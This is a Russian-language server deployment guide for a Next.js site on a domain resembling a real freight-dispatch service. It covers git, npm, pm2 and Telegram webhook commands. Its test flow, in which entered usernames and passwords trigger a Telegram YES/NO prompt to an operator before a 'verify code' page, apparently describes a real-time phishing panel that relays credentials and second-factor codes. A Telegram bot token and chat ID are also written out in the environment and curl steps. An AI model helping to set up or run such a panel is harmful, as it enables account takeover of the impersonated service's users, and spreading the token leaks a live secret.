# 📦 Полная инструкция по загрузке проекта на сервер

## ✅ Шаг 1: Закоммитить и запушить изменения (на локальной машине)

```bash
# Если еще не закоммичено:
git add .
git commit -m "Add Telegram bot integration"
git push origin main
```

**Если push не работает** (ошибка GitHub), попробуйте позже или используйте альтернативный способ ниже.

## 🚀 Шаг 2: Обновить проект на сервере

### Вариант A: Через Git (если push прошел успешно)

```bash
ssh centraldispatch
cd /var/www/centraldispatch.id
source ~/.nvm/nvm.sh
git pull origin main
npm install
rm -rf .next
npm run build
pm2 restart centraldispatch-nextjs --update-env
pm2 save
```

### Вариант B: Вручную (если push не работает)

Если Git push не работает, можно скопировать файлы вручную через SCP или обновить только нужные файлы.

## 🔧 Шаг 3: Настроить переменные окружения

### Способ 1: Через ecosystem.config.js (уже настроено)

Файл `ecosystem.config.js` уже содержит токены Telegram. Просто перезапустите:

```bash
pm2 restart centraldispatch-nextjs --update-env
pm2 save
```

### Способ 2: Через .env файл

```bash
cd /var/www/centraldispatch.id
nano .env
```

Добавьте:
```env
TELEGRAM_BOT_TOKEN=8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs
TELEGRAM_CHAT_ID=5257327001
```

## 📡 Шаг 4: Настроить Telegram Webhook

```bash
curl -X POST "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/setWebhook?url=https://centraldispatch.id/api/telegram/webhook"
```

**Ожидаемый ответ:**
```json
{"ok":true,"result":true,"description":"Webhook was set"}
```

## ✅ Шаг 5: Проверить Webhook

```bash
curl "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/getWebhookInfo"
```

Должен вернуть ваш домен в поле `url`.

## 🔄 Шаг 6: Перезапустить приложение

```bash
pm2 restart centraldispatch-nextjs --update-env
pm2 save
pm2 status
```

## 🧪 Шаг 7: Проверить работу

1. Откройте https://centraldispatch.id/sign-in
2. Введите username и password
3. Нажмите SIGN IN
4. Должен появиться круговой loading
5. Проверьте Telegram - должно прийти сообщение с кнопками YES/NO
6. Нажмите YES → переход на verify code
7. Нажмите NO → показывается "error sign in.png"

## 📋 Чеклист

- [ ] Код обновлен на сервере (`git pull`)
- [ ] Зависимости установлены (`npm install`)
- [ ] Проект пересобран (`npm run build`)
- [ ] Переменные окружения настроены
- [ ] Webhook настроен
- [ ] Приложение перезапущено (`pm2 restart --update-env`)
- [ ] Проверена работа входа

## 🐛 Если что-то не работает

### Проверить логи:
```bash
pm2 logs centraldispatch-nextjs --err --lines 50
```

### Проверить переменные окружения:
```bash
pm2 describe centraldispatch-nextjs | grep TELEGRAM
```

### Проверить webhook:
```bash
curl "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/getWebhookInfo"
```

### Проверить endpoint:
```bash
curl https://centraldispatch.id/api/telegram/webhook
```

